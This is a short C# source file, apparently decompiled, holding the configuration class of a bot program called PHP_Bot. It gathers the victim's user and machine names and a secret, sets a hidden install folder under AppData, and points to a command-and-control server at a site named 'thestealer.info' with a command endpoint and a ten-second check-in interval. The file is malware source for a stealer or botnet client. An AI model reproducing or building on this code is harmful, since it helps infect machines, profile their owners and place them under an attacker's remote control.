using System;
using PHP_Bot.RS.Bots;

namespace PHP_Bot;

internal class Config
{
	public static string Username = Environment.UserName;

	public static string MachineName = Environment.MachineName;

	public static string Secret = Methods.GetSecret();

	public static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static string Location = AppData + "\\Pandora";

	public static string Base = "http://thestealer.info/";

	public static string Command = Base + "command.php";

	public static Form1 form;

	public static Nexus nexus = new Nexus();

	public static int CheckInTime = 10;

	public static bool Registered = false;
}
